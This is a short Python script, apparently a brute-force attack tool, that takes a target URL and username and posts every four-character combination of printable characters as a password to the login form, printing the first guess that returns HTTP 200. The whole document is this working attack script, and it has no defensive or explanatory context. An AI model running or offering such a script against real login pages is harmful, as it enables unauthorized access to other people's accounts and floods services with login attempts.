import itertools
import string
import requests
import sys

# Takes URL and Username as command line arguments.
url = sys.argv[1]
user = sys.argv[2]

for n in range (4, 5):
    for guess in itertools.product(string.printable, repeat=n):
        guess = "".join(guess)
        data = {"username":user, "password":guess}
        res = requests.post(url, data = data)
        if res.status_code == 200:
            print(guess)
            exit()
